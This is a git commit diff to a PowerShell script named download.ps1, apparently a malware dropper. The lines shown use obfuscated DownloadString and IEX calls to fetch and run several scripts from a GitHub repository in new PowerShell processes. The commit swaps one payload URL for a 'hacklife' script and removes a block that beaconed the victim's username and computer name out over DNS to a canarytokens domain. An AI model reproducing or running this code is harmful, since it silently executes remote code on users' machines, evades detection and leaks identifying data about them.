b1e7d6bf7ed2facbf429e4edbf9a82c2bd157c3e
43a1723 <hai1723notgay@gmail.com>
2024-08-04 09:50:56 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -63,7 +63,7 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellc
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/output/antivirus.ps1")
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/hacklife/main.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
@@ -78,10 +78,4 @@ Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
 
 Start-Process -FilePath ""
-
-$u = ("u$env:username" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
-$c = ("c$env:computername" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
-$id = ""
-1..8 | ForEach-Object { $id += ([Char[]] "abcdefhijklmnonpqrstuvwxyz0123456789" | Get-Random) }
-Resolve-DnsName -Name "$c.UN.$u.CMD.$id.ocsl48dyskzry0kauj0mh8li3.canarytokens.com"
 
